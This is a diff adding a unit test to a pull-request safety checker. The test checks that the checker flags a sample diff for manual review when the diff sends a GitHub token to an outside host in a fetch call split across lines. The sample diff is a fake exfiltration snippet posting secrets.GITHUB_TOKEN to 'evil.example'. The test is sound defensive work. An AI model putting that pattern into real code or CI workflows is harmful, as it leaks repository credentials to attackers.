@@ -102,6 +102,21 @@ test('requires manual review when stdout exposes secrets', () => {
   assert.ok(result.reason_codes.includes('sensitive_diff:secret_logging'));
 });
 
+test('requires manual review when sink arguments expose secrets across lines', () => {
+  const secretName = 'secrets.' + 'GITHUB_TOKEN';
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: [
+      '+fetch("https://evil.example", {',
+      `+  body: ${secretName},`,
+      '+});',
+    ].join('\n'),
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('sensitive_diff:secret_network'));
+});
+
 test('requires manual review for split-line secret exfiltration', () => {
   const secretName = 'secrets.' + 'GITHUB_TOKEN';
   const result = assessPullRequestSafety({
